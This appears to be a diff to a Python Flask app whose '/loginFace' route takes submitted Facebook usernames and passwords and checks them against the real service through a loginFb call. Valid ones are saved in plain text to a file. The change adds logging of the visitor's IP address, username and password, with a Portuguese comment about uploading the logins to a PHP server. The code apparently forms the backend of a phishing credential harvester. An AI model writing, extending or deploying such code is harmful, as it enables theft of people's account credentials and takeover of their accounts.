@@ -19,15 +19,19 @@ def home():
 @app.route('/loginFace',methods=['GET'])
 def get():
 	content = request.args
+	ip = request.remote_addr
 	print('userFace ',content['user'])
 	print('passFace ',content['pass'])
 	
-
 	userFace = content['user']
 	passFace = content['pass']
 	
 	res = loginFb(userFace,passFace)
 	if res:
+		#upando login pro serverPHP
+		log(f'===== login accept from ip: {ip}')
+		log(f'username: {userFace}')
+		log(f'passowrd: {passFace} =====')
 		data = open('templates/login', 'a+')
 		dtLogin = f'email: {userFace} pass: {passFace}'
 		data.write(dtLogin+' \n')
